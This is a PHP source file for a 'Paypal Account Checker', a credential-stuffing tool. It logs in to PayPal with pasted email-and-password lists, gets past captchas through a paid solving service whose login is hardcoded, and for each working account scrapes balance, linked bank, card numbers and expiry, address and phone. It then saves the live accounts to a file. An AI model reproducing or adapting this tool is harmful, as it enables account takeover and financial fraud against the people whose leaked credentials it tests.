<?php
$sock = '';
echo '
<DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<head><link rel="shortcut icon" type="image/x-icon" href="http://www.vhcteam.net/VHC/images/inferno/icons/home.png"><title>Paypal Account Checker</title></head>
<style>
* body
{
    background-color: rgb(74,81,85);
}
body,td,th {
    color: #99CC00;
}
h2
{
    color: #FFCC00;
}
h1 {
    padding: 10px 15px;
}
.main-content {
    width: 70%; height: 200px;margin: auto; background: rgb(74,81,85);  border-radius: 5px 5px 5px 5px; box-shadow: 0 0 3px rgba(0, 0, 0, 0.5); min-height: 340px;  position: relative;
}
textarea, input {
    border-radius: 5px 5px 5px 5px;
}
input {
    height: 20px;width: 70px;text-align: center;
}
.button {
    
}
.submit-button 
    { 
        background: #57A02C;
        border:solid 1px #57A02C;
        border-radius:5px;
            -moz-border-radius: 5px; 
            -webkit-border-radius: 5px;
        -moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
        -webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
        text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
        border-bottom: 1px solid rgba(0,0,0,0.25);
        position: relative;
        color:#FFF;
        display: inline-block; 
        cursor:pointer;
        font-size:13px;
        padding:3px 8px;
        height: 30px;width: 120px;
    }
    .submit-button:hover { 
    background:#82D051;border:solid 1px #86CC50;
    height: 30px;width: 120px;  }

#show {
    width: 70%;margin: auto;padding: 10px 10px;
}
</style>
    <script type="text/javascript">
        function pushPaypalDie(str){
            document.getElementById(\'listPaypalDie\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushPaypal(str){
            document.getElementById(\'listPaypal\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushWrongFormat(str){
            document.getElementById(\'listWrongFormat\').innerHTML += \'<div>\' + str + \'</div>\';
        }
    </script>
</head>
<body>
<div class="main-content">
    <section id="main" class=""><center><h1>Paypal Account Checker</h1>
<form method="post">
<div align="center"><textarea name="mp" rows="10" style="width:90%">';
if (isset($_POST['btn-submit']))
    echo $_POST['mp'];
else
    echo '0|1|2';
;
echo '</textarea><br />
Delim: <input type="text" name="delim" value="';
if (isset($_POST['btn-submit']))
    echo $_POST['delim'];
else
    echo '|';
;
echo '" size="1" />Email: <input type="text" name="mail" value="';
if (isset($_POST['btn-submit']))
    echo $_POST['mail'];
else
    echo 1;
;
echo '" size="1" />Password: <input type="text" name="pwd" value="';
if (isset($_POST['btn-submit']))
    echo $_POST['pwd'];
else
    echo 2;
;
echo '" size="1" />&nbsp;
<input type="checkbox" name="bank" checked="checked" value="1" />Check Bank<input type="checkbox" name="card" checked="checked" value="1" />Check Card<input type="checkbox" name="info" checked="checked" value="1" />Get info<br />
<input type="submit" class = "submit-button" value=" Check NOW " name="btn-submit" /> </br>
<center><h4>Copyright Â© By Nuoc Mia - All Rights Reserved</h4></center>
</div>
</form>
';
require_once 'deathbycaptcha.php';
set_time_limit(0);
include("use.php");
$username = $argv[1];
$password = $argv[2];
$client = new DeathByCaptcha_SocketClient('Eyerome', 'ierome702');
$client->is_verbose = true;
$captcha_filename = ('secret.jpeg');
//echo "Your balance is {$client->balance} US cents\n";
for ($i = 3, $l = count($argv); $i < $l; $i++) {
    $captcha_filename = $argv[$i];
}
function curl($url = '', $var = '', $header = false, $nobody = false) {
    global $config, $sock;
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_NOBODY, $header);
    curl_setopt($curl, CURLOPT_HEADER, $nobody);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_USERAGENT, random_uagent());
    curl_setopt($curl, CURLOPT_REFERER, 'https://www.paypal.com/');
    if ($var) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
    }
    curl_setopt($curl, CURLOPT_COOKIEFILE, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}

function fetch_value($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}
function fetch_value_notrim($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return substr($str, $start + $length, $end);
}
$dir = dirname(__FILE__);
$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
if (!file_exists($config['cookie_file'])) {
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
$zzz = "";
$live = array();
function get($list) {
    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);
    return $socks[0];
}
function delete_cookies() {
    global $config;
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
function xflush() {
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
  
   if ($output_handler == 'ob_gzhandler') {
        return;
    }
	
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}
function isSockClear() {
    global $sock;
    $str = curl('https://www.paypal.com/xclick/business=paypal%40dreamhost.com&rm=2&item_name=Web+Hosting+Donation&item_number=donation_13185&amount=10&image_url=https%3A//secure.newdream.net/dreamhostpp.gif&no_shipping=1&no_note=1&return=http%3A//www.dreamhost.com/donate.cgi&cancel_return=&tax=0&currency_code=USD');
    if ($str === false) {
        return -1;
    }
    if (stripos($str, 'password') !== false) {
        return 0;
    }
    return 1;
}
function display($str) {
    echo '<div>' . $str . '</div>';
    xflush();
}
//function pushSockDie($str) {
   // echo '<script type="text/javascript">pushSockDie(\'' . $str . '\');</script>';
  //  xflush();
//}
function pushPaypalDie($str) {
    echo '<script type="text/javascript">pushPaypalDie(\'' . $str . '\');</script>';
	file_put_contents('api/accountsdead.txt', $str . PHP_EOL, FILE_APPEND);  
    xflush();
}
function pushPaypal($str) {
    echo '<script type="text/javascript">pushPaypal(\'' . $str . '\');</script>';
	file_put_contents('api/accounts.txt', $str . PHP_EOL, FILE_APPEND);  
    xflush();
}
function pushWrongFormat($str) {
    echo '<script type="text/javascript">pushWrongFormat(\'' . $str . '\');</script>';
    xflush();
}
function infoCard() {
    global $config, $sock;
    $response = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&flag_from_account_summary=1&nav=0.5.2');
    $checkcard = fetch_value($response, 's.prop1="', '"');
    if (stripos($checkcard, 'ccadd') !== false) {
        return false;
    }
    preg_match_all('/<tr>(.+)<\/tr>/siU', $response, $matches);
    $cc = array();
    foreach ($matches[1] AS $k => $v) {
        if ($k > 0) {
            preg_match_all('/<td>(.+)<\/td>/siU', $v, $m);
            $type = fetch_value($m[1][0], 'alt="', '"');
            $ccnum = $m[1][1];
            $exp = $m[1][2];
            $cc[] = "$type [$ccnum $exp]";
            $cc++;
        }
    }
    $infocard = "<font color=\"#EDAD39\">" . implode("-", $cc) . "</font>";
    return $infocard;
}
function infoBank() {
    global $config, $sock;
    $response = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach&nav=0.5.1');
    if (stripos($response, 'ach_id') !== false) {
        return true;
    }
    return false;
}
function info() {
    global $config, $sock;
    $response = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&nav=0.6.3');
    $info = str_replace('<br>', ', ', fetch_value($response, 'emphasis">', '</span>'));
    return substr($info, 0, -2);
}
function infoPhone() {
    global $config, $sock;
    $response = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-phone&nav=0.6.4');
    $info = strip_tags('<input type="hidden" ' . fetch_value($response, 'name="phone"', '</label>'));
    return $info;
}
if (isset($_POST['btn-submit'])) {
    ;
    echo '<br>
<br>
<div>List Paypal LIVE:</div>
<div id="listPaypal"></div>
<hr />
<div>List Paypal DIE:</div>
<div id="listPaypalDie"></div>
<hr />
<!--<div>List Socks DIE|BLACKLIST:</div>
<div id="listDie"></div>
<hr /> -->
<div>List Wrong Format:</div>
<div id="listWrongFormat"></div>
<hr />
';
    xflush();
    $emails = explode("\n", trim($_POST['mp']));
    $eCount = count($emails);
    $failed = $live = $uncheck = array();
    $checked = 0;
    if (!count($emails)) {
        continue;
    }
    delete_cookies();
    //$sockClear = isSockClear();
    //if ($sockClear != 1) {
        //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
        //continue;
    //}
    display('<font color="#00FF00">Load => OK => Checking...</font>');
    foreach ($emails AS $k => $line) {
        $info = explode($_POST['delim'], $line);
        $email = trim($info["{$_POST['mail']}"]);
        $pwd = trim($info["{$_POST['pwd']}"]);
        if (stripos($email, '@') === false || strlen($pwd) < 8) {
            unset($emails[$k]);
            pushWrongFormat($email . ' | ' . $pwd);
            continue;
        }
        //if ($failed[$sock] > 4)
         //   continue;
		 $file = ('header.txt');
$title = fetch_value($s, 'title>', '</title>');
file_put_contents($file, $title);
        delete_cookies();
        if (curl('https://www.paypal.com/', '', true, true) === false) {
            //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
            continue;
        }
        $var = 'login_cmd=&login_params=&login_email=' . rawurlencode($email) . '&login_password=' . rawurlencode($pwd) . '&target_page=0&submit.x=Log+In&form_charset=UTF-8&browser_name=Firefox&browser_version=17&browser_version_full=17.0&operating_system=Windows';
        $s = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8d0b7e678a25d883d0fa72c947f193f8fd', $var);
        if ($s === false) {
            //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
            continue;
        }
        if (stripos($s, 'security challenge') !== false) {
            //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
			pushPaypalDie("<b style=\"color:red\">Captcha</b> => $sock | $email | $pwd | $title | $captcha");
$captcha = fetch_value_notrim($s, '<p class="ngCaptcha"><img src="', '&#x3f;version&#x3d;');
$imagestring=curl($captcha);
imagejpeg(imagecreatefromstring($imagestring),"secret".".jpeg");
$death_array=array();
    if ($captcha1 = $client->upload($captcha_filename)) {
        //echo "CAPTCHA {$captcha['captcha']} uploaded\n";

        sleep(DeathByCaptcha_Client::DEFAULT_TIMEOUT);

        // Poll for CAPTCHA text:
        if ($text = $client->get_text($captcha1['captcha'])) {
            //echo "CAPTCHA {$captcha['captcha']} solved: {$text}\n";
			//echo $text.'<br/>';
			//$var = 'login_cmd=&login_params=&login_email=' . rawurlencode($email) . '&login_password=' . rawurlencode($pwd) . '&target_page=0&securityCode='.$text.'&form_charset=UTF-8&browser_name=Firefox&browser_version=17&browser_version_full=17.0&operating_system=Windows&gif_continue.x=Continue';
			$var='myAllTextSubmitID=&cmd=_login-submit&auction_type=&gif_challenge_key=&securityCode='.$text.'&gif_continue.x=Continue&auth=';
			$auth=fetch_value($s,'<input name="auth" type="hidden" value="','"><input name="form_charset" type="hidden" value="UTF-8"></form>');
			$var.=$auth.'&form_charset=UTF-8';
			$s = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8d0b7e678a25d883d0fa72c947f193f8fd', $var);
			//echo $s;
            // Report an incorrectly solved CAPTCHA.
            // Make sure the CAPTCHA was in fact incorrectly solved!
            //$client->report($captcha['captcha']);
        }
    }
/*$death_array=$client->upload(file_get_contents("secret.jpeg");//'base64:'.base64_encode($imagestring)
var_dump($death_array);
$captcha_text=$death_array['text'];
echo $captcha_text.'<br/>';*/
//echo 'Captcha: '.$captcha_text.'<br/>';
//grab_image();

            			//pushPaypalDie("<b style=\"color:red\">Hit the Captcha Bullshit Again</b> => $title");
			
			//continue;
        }
        $checked++;
        $error = fetch_value($s, 's.prop14="', '"');
        if ($error = fetch_value($s, 's.prop14="', '"')) {
            unset($emails[$k]);
            pushPaypalDie("<b style=\"color:red\">Die</b> => $sock | $email | $pwd");
            continue;
        }
        $loggedIn = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&nav=0.0");
        if ($loggedIn === false) {
            //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
            unset($emails[$k]);
            array_push($emails, $line);
            continue;
        }
        if (stripos($loggedIn, 'class="balance">') !== false) {
            $pp = array();
            if (isset($_POST['checkEmail'])) {
                $mail->set('email', $email);
                $mail->set('pwd', $pwd);
                $mail->set('sock', $sock);
                $pp['email'] = $mail->check();
            }
            $loggedIn = preg_replace('/<!--google(off|on): all-->/si', '', $loggedIn);
            $loggedIn = preg_replace('/\n+/si', '', $loggedIn);
            $pp['type'] = fetch_value($loggedIn, 's.prop7="', '"');
            $pp['type'] = '<span class="' . $pp['type'] . '">' . ucfirst($pp['type']) . '</span>';
            $pp['status'] = fetch_value($loggedIn, 's.prop8="', '"');
            $pp['status'] = '<span class="' . $pp['status'] . '">' . ucfirst($pp['status']) . '</span>';
            if (stripos($loggedIn, 'Your account access is limited') !== false) {
                $pp['limited'] = '<font color="red">Limited</font>';
            }
            $pp['bl'] = fetch_value($loggedIn, '<span class="balance">', '</span>');
            if ($pp['bl']) {
                if (stripos($pp['bl'], 'strong') !== false) {
                    $pp['bl'] = trim(fetch_value($pp['bl'], '<strong>', '</strong>'));
                }
            } else {
                $pp['bl'] = fetch_value($loggedIn, '<span class="balance negative">', '</span>');
            }
            if (!isset($pp['limited'])) {
                if ($_POST['bank']) {
                    $pp['bank'] = infoBank() ? "Have Bank" : "No Bank";
                }
                if ($_POST['card']) {
                    $card = infoCard();
                    $card = ($card) ? $card : "No Card";
                    $pp['card'] = $card;
                }
                if ($_POST['info']) {
                    $pp['address'] = info();
                    $pp['phone'] = infoPhone();
                }
            }
            $pp['lastloggin'] = strip_tags(fetch_value($loggedIn, '<div class="small secondary">', '</div>'));
            $pp['lastloggin'] = str_replace('Last log in', '', $pp['lastloggin']);
            $xyz = "<b style=\"color:yellow\">Live</b> => $sock | $email | $pwd | " . implode(" | ", $pp);
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);
        } else {
            $title = fetch_value($s, 'title>', '</title>');
            pushPaypalDie("<b style=\"color:red\">Bad Account</b> => $sock | $email | $pwd | $title");
            unset($emails[$k]);
        }
        xflush();
    }
}
if (isset($eCount, $live)) {
    display("<h3>Total: $eCount - Checked: $checked - Live: " . count($live) . "</h5>");
    display(implode("<br />", $live));
    if (count($emails)) {
        display("Uncheck:");
        display('<textarea cols="80" rows="10">' . implode("\n", $emails) . '</textarea>');
    }
}
echo '</body>
</html>';